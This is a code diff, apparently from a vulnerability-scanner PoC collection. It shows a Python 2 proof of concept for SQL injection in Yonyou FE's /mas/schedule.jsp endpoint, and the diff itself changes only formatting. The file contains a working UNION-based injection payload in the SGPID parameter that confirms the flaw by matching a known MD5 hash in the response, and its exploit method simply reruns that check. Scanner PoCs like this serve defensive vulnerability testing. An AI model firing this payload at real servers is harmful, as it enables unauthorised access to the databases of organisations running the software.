@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0035' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0035'  # 平台漏洞编号，留空
     name = '用友fe SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         用友fe /mas/schedule.jsp 参数过滤不完整，SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'db8eae05-7087-4764-8d8c-e19b99866304'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/mas/schedule.jsp?type=group&SGPID=1%27+UNION+ALL+SELECT+1,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%273.14%27)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -39,12 +41,13 @@ class Poc(ABPoc):
             if r.status_code == 200 and '0x4beed3b9c4a886067de0e3a094246f78' in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                           
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
